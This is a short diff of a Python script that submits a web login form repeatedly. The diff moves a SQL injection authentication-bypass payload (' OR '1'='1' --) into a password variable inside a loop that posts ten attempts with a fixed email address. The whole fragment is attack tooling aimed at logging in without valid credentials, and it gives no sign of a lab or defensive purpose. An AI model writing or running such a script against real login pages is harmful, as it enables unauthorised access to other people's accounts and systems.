@@ -37,7 +37,7 @@ def submit_form(_token, session, email, password, remember, payloads, headers):
     data = {
         '_token': _token,
         'email': email,
-        'password': f"' OR '1'='1' --",
+        'password': password,
         'remember': remember
     }
     try:
@@ -70,6 +70,7 @@ def main():
             for _ in range(10):  # Loop 10 times for testing, you can increase this number
                 email = 'itsmehacker062@gmail.com'
                 remember = "on"  # 'Remember Me' checkbox checked
+                password = f"' OR '1'='1' --"
                 submit_form(_token, session, email, password, remember, payloads, headers)
 
 if __name__ == "__main__":
